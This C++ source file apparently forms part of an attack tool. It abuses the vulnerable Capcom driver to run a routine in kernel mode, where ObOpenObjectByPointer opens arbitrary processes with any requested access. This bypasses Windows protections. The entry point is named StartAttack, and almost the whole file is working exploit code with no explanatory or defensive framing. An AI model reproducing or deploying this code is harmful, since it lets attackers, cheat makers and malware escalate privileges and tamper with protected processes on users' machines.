
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include "CapcomWrapper.h"
#include "OpenProcessAttack.h"

using namespace std;
 
//Links against ntdll for RtlInitUnicodeString implementation
// #pragma comment(lib, "ntdll.lib")
 
BOOLEAN g_InitializationFinished = FALSE;
 
void GetSystemRoutines(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress) {
    UNICODE_STRING
        usPsLookupProcessByProcessId,
        usObDereferenceObject,
        usPsProcessType,
        usObOpenObjectByPointer;
 
    RtlInitUnicodeString(&usPsLookupProcessByProcessId, L"PsLookupProcessByProcessId");
    RtlInitUnicodeString(&usObDereferenceObject, L"ObDereferenceObject");
    RtlInitUnicodeString(&usPsProcessType, L"PsProcessType");
    RtlInitUnicodeString(&usObOpenObjectByPointer, L"ObOpenObjectByPointer");
 
    PsLookupProcessByProcessId = (decltype(PsLookupProcessByProcessId))pMmGetSystemRoutineAddress(&usPsLookupProcessByProcessId);
    ObDereferenceObject = (decltype(ObDereferenceObject))pMmGetSystemRoutineAddress(&usObDereferenceObject);
    PsProcessType = (decltype(PsProcessType))pMmGetSystemRoutineAddress(&usPsProcessType);
    ObOpenObjectByPointer = (decltype(ObOpenObjectByPointer))pMmGetSystemRoutineAddress(&usObOpenObjectByPointer);
 
    g_InitializationFinished = TRUE;
}
 
void __stdcall CapcomOpenProcess(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID CustomData) {
    NTSTATUS status = 0;
    PEPROCESS process = NULL;
    HANDLE handle = NULL;
    OPENPROCESS_DATA* data = (OPENPROCESS_DATA*)CustomData;
 
    if(!g_InitializationFinished) {
        GetSystemRoutines(pMmGetSystemRoutineAddress);
    }
 
    __try {
        if(data->processId != NULL) {
            status = PsLookupProcessByProcessId(data->processId, &process);
        }
        if(status >= 0) {
            status = ObOpenObjectByPointer(
                process, 
                0, 
                NULL, 
                data->access,
                *PsProcessType,
                0/*KernelMode*/,
                &handle);
            if(status >= 0) {
                data->returnedHandle = handle;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
 
    }
    if (process != NULL) {
        ObDereferenceObject(process);
    }
}



BOOL StartAttack(HANDLE processId, ACCESS_MASK access) {

    if (!InitDriver()) {
        return FALSE;
    }

    OPENPROCESS_DATA data;
    data.processId = processId;
    data.access = access;
    data.returnedHandle = NULL;

    RunInKernel(CapcomOpenProcess, &data);

    if (data.returnedHandle == NULL) {
        return FALSE;
    }

    // cout << data.returnedHandle << endl;

    return TRUE;
}

// struct Test_t {
//     void* fpDbgPrintEx = NULL;
// };


// static void __stdcall TestFunc(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID customdata) {
//     Test_t*   data    = (Test_t*)customdata;
//     UNICODE_STRING routineNameU = { 0 };
// 	RtlInitUnicodeString(&routineNameU, L"DbgPrintEx");

// 	data->fpDbgPrintEx = (void*)pMmGetSystemRoutineAddress(&routineNameU);

// }